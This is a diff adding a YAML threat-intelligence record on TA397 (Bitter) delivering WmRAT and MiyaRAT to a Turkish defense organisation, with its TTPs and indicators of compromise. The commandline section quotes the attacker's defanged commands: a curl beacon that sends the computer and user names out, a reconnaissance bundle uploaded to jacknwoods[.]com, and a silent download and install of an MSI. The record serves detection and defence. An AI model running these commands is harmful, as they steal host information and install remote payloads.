@@ -1,0 +1,58 @@
+description: TA397 targeted a Turkish defense sector organization with a lure about
+  public infrastructure projects in Madagascar, using alternate data streams in a
+  RAR archive to deliver a LNK file that created a scheduled task on the target machine.
+attribution:
+- TA397 (Bitter)
+malware_families:
+- WmRAT
+- MiyaRAT
+TTPs:
+  processes:
+  - conhost.exe
+  - cmd.exe
+  - curl.exe
+  - msiexec.exe
+  commandline:
+  - conhost --headless cmd /k "cmd < ~tmp.pdf:Participation & exit"
+  - curl hxxp[:]//jacknwoods[.]com/jacds[.]php?jin=%computername%_%username%
+  - cd C:\\programdata dir >> abc[.]pdf tasklist >> abc[.]pdf wmic /namespace:\\\\root\\SecurityCenter2
+    path AntiVirusProduct get displayName >> abc[.]pdf cmd /c curl -X POST -F "file=[@]C:\\programdata\\abc[.]pdf"
+    hxxps[:]//www[.]jacknwoods[.]com/chthuo[.]php?ain=%computername%_%username% del
+    abc[.]pdf
+  - curl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi
+    msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart
+  powershell:
+  - cmd < ~tmp.pdf:Participation & exit
+  scripting_engine:
+  - Base64 encoded PowerShell from Participation ADS
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - curl.exe -> hxxp[:]//jacknwoods[.]com/jacds[.]php?jin=%computername%_%username%
+  - curl.exe -> hxxps[:]//www[.]jacknwoods[.]com/chthuo[.]php?ain=%computername%_%username%
+  file_activity:
+  - C:\\programdata\\abc[.]pdf
+  - C:\\users\\public\\music\\gfxview.msi
+  persistence: []
+  pipes: []
+  process_relations:
+  - conhost.exe -> cmd.exe
+IOCs:
+  hashes: []
+  IPs:
+  - 185.244.151[.]84
+  - 38.180.142[.]228
+  - 96.9.215[.]155
+  domains:
+  - jacknwoods[.]com
+  - academymusica[.]com
+  - samsnewlooker[.]com
+  URLs: []
+authors:
+- Nick Attfield
+- Konstantin Klinger
+- Pim Trouerbach
+- David Galazin
+reference: https://www.proofpoint.com/us/blog/threat-insight/hidden-plain-sight-ta397s-new-attack-chain-delivers-espionage-rats
+date_of_publication: December 17, 2024
+file_creation_date: July 28, 2025
